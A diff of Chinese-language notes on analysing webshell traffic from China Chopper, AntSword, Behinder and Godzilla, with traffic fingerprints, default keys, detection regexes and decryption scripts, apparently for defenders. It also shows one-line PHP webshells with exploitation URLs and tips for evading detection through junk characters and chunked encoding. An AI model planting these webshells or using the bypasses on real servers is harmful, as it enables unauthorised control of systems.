@@ -14,21 +14,21 @@ php一句话 <?php @eval($_POST["pass"]);?>
 - Webshell对本地资源具备一定的操作能力，其操作本地资源的范围取决于解析器的权限。
 
 ```php
-# webshell: 1.php
+# Webshell: 1.php
 <?php echo system($_GET["cmd"]);?>
 # 利用方式 
 http://ip:port/hackable/uploads/1.php?cmd=ls
 ```
 
 ```php
-# webshell: 2.php
+# Webshell: 2.php
 <?php eval($_GET["cmd"]);?>
 # 利用方式
 http://ip:port/hackable/uploads/2.php?cmd=phpinfo();
 ```
 
 ```php
-#  webshell: 3.php
+#  Webshell: 3.php
 <?php include "shell.jpg";?>
 # 利用方式
 # 上传shell.jpg到同一目录，其中包含代码<?php phpinfo();?>
@@ -93,7 +93,6 @@ edjpg软件：
 - 明文传输。
 - npc是php一句话木马的password。
 
-
 ![img](images/Webshell流量分析/202211091032518.png)
 
 ### Antsword 蚁剑
@@ -124,7 +123,9 @@ if(cls!=null){
 #### 流量特征
 
 - 明文传输。
-- ant是jsp一句话木马的password。
+- 参数名：
+	- 未经过混淆加密，参数名为 `ant`。
+	- 经过混淆加密后，参数名大多为`_0x.....=`形式（下划线可替换为其他）。
 
 ![img](images/Webshell流量分析/202211091034381.png)
 
@@ -172,15 +173,21 @@ else
 
 #### 流量特征
 
-- 密文传输。
-- Response响应包的Content Length为16。
+- 密钥特征：使用AES加密+Base64编码，AES使用动态密钥对通信进行加密。
+- 请求包/响应包固定字节：请求包前21字节，响应包前42字节为固定值，一般与Webshell密码有关。
+- 请求头User-Agent字段：内置了 10 种 User-Agent，每次连接 Shell 时会随机选择一个进行使用。因此当发现一个IP的请求头中的User-Agent在频繁变换，就可能是冰蝎。
+- 响应数据包：响应数据包中长度为16的字符串为key，例如`93edbafac50eb64c`。
+
+简单的流量拦截：
+
+```shell
+# \b匹配边界符
+^[a-z0-9]{16}\b
+
+# 提取出93edbafac50eb64c
+```
 
 #### 流量解密
-
-AES加密，参考工具：https://oktools.net/aes
-
-- Response响应包的content length为16的字符串为key，例如`93edbafac50eb64c`。
-- 模式：CBC，填充：Pkcs7。
 
 ![img](images/Webshell流量分析/202211091042813.png)
 
@@ -193,8 +200,9 @@ key = 93edbafac50eb64c
 # 密文
 cipher = pu+VEA885HAovMSbbH5wj3cXwQkpnSRYpZy8fAWrRA3ETLuyZqRQSm6koxDp1mKeTYLUlMk59hK6lOAbj2Hh/vxXzVyn/4uPlKV7WeMOeRGLhBQMou01R+TJLP7NTtVn
 
-# 通过在线工具解密
-# 明文
+# 通过工具解密 https://oktools.net/aes
+# 模式：CBC
+# 填充：Pkcs7
 {"status":"c3VjY2Vzcw==","msg":"YmMzYjNhNzktY2Q4NC00ZGUwLWJjYzUtMjQ0NmY4NzUxNjE1"}
 # 再通过base64解密
 {"status":"c3VjY2Vzcw==","msg":"bc3b3a79-cd84-4de0-bcc5-2446f8751615"}
@@ -237,17 +245,53 @@ session_start();
 
 #### 流量特征
 
-- 冰蝎最小的流量包，**请求头的content length都大于5000**。
-- 采用POST方式进行连接。
-- 数据包中都是base64编码，WAF无法防御。
+- 密钥特征：使用AES加密+Base64编码，取消了冰蝎2.0的动态获取密钥，使用固定的连接密钥，AES加密的密钥为连接密码MD5的前16位，默认连接密码是`rebeyond`（即`md5('rebeyond')[0:16]=e45e329feb5d925b`）。
+- 请求包/响应包固定字节：请求包前21字节，响应包前42字节为固定值，一般与Webshell密码有关。
+- 请求头User-Agent字段：内置了 10 种 User-Agent，每次连接 Shell 时会随机选择一个进行使用。
+- 请求头Content-Type字段：
+```
+JSP：Application/octet-stream
+```
+- 请求头Content-Length字段：即使是冰蝎3.0最小的流量包，请求头的Content-Length都要大于5000。
 
 ![img](images/Webshell流量分析/202211091045328.png)
+
+一些绕过的思路：
+
+- 在Webshell前后加入无规则字符。
+- 使用分块编码传输绕过，请求头 `Transfer-Encoding: chunked`。
+
+#### 流量解密
+
+
+
+冰蝎3.0基础解密脚本示例：
+
+```python
+import base64
+from Crypto.Cipher import AES
+def aes_decode(data, key):
+    try:
+        aes = AES.new(str.encode(key), AES.MODE_ECB)
+        decrypted_text = aes.decrypt(data)
+        decrypted_text = decrypted_text[:-(decrypted_text[-1])]
+    except Exception as e:
+        print(e)
+    return decrypted_text
+if __name__ == '__main__':
+    key = 'eac9fa38330a7535'
+    data = b" KCbAGC/zgT89mb2V…<YOUR_PAYLOAD_HERE>"
+    data = base64.b64decode(data)
+    a = aes_decode(data, key)
+    print(a)
+```
 
 ### Behinder 冰蝎4
 
 #### 基础代码
 
 冰蝎 4 内置传输协议：
+
 - default_xor
 - default_xor_base64
 - default_aes
@@ -313,18 +357,8 @@ default aes 解密函数：
 
 #### 流量特征
 
-1. Accept 字段
-```
-Accept: application/json, text/javascript, _/_; q=0.01
-```
-
-2. Content-Type 字段
-```
-PHP：Application/x-www-form-urlencoded  
-ASP：Application/octet-stream
-```
-
-3. User-Agent 字段：内置了 10 种 User-Agent，每次连接 shell 时会随机选择一个进行使用。
+- 密钥特征：提供传输协议自定义的功能，让用户对流量的加密和解密进行自定义。不再有连接密码的概念，自定义传输协议的算法就是连接密码。默认时，密钥与冰蝎3.0相同，即`e45e329feb5d925b`。
+- 请求头User-Agent字段：内置了 10 种 User-Agent，每次连接 Shell 时会随机选择一个进行使用。
 ```
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
@@ -337,15 +371,28 @@ ASP：Application/octet-stream
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0",
 "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
 ```
-
-4. Connection 字段：`Keep-Alive`
+- 请求头Accept字段（弱特征）：
+```
+Accept: application/json, text/javascript,*/*; q=0.01
+Accept: application/json, text/javascript
+```
+- 请求头Content-Type字段（弱特征）：
+```
+PHP：Application/x-www-form-urlencoded  
+ASP：Application/octet-stream
+```
+- 请求头Connection字段：使用长连接，避免了频繁的握手造成的资源开销。
 ```
 Connection: Keep-Alive
 ```
-
-5. Cookie 字段：`PHPSESSID=xxx`
+- 请求头Cookie字段：`PHPSESSID=xxx`
 ```
 Cookie: PHPSESSID=hslqlp72irgjae6hcdgb2tcb9k
+```
+- 字节特征：默认情况下，有固定的请求头和响应头。
+```
+请求：dFAXQV1LORcHRQtLRlwMAhwFTAg/M
+响应：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd
 ```
 
 #### 流量解密
@@ -411,11 +458,12 @@ if __name__ == '__main__':
         except:  
             pass
 ```
+
 ### Godzilla 哥斯拉
 
 #### 基础代码
 
-- 生成php的webshell代码：管理→生成
+- 生成php的Webshell代码：管理→生成
 
 ```
 密码：pass				
@@ -475,16 +523,36 @@ echo substr(md5($pass.$key),16);
 
 #### 流量特征
 
-- 每一个响应流量最后都带有`6c37ac826a2a04bc`。
+- 连接建立请求：建立连接时会发起三次请求，第一次请求数据超级长，用于建立 Session，第二、三次请求确认连接，第二、三次的请求和响应基本是一致的。
+- 请求头Cookie字段：最后有一个分号 `;`
+- 响应包数据：哥斯拉会将key（32位的md5字符串）拆分成两个部分，分别放在Base64编码的数据的前后，整个响应包的结构为：`md5前16位+base64+md5后16位`。默认情况下，每一个响应流量最后都带有`6c37ac826a2a04bc`。
+
+```shell
+# md5前16位 + base64 + md5后16位
+# md5前16位：11cd6a8758984163
+# base64：fL1tMGI4YTljOv79NDQm7r9PZzBiOA==
+# md5后16位：6c37ac826a2a04bc
+40
+11cd6a8758984163fL1tMGI4YTljOv79NDQm7r9PZzBiOA==6c37ac826a2a04bc
+0
+```
 
 ![img](images/Webshell流量分析/202211091046532.png)
 
+简单的流量拦截：
+
+```shell
+# 特征1：64位
+# 特征2：== 和 16位md5
+[A-Za-z0-9+/]{46}==[a-z0-9]{16}\n\s
+```
 
 #### 流量解密
 
+参考阅读：Godzilla java Decode,哥斯拉jsp(内存马)流量解密 https://github.com/AlphabugX/godzilla_decode
+
 ```python
 # -*- coding: utf-8 -*-
-
 import base64
 import zlib
 from Crypto.Cipher import AES
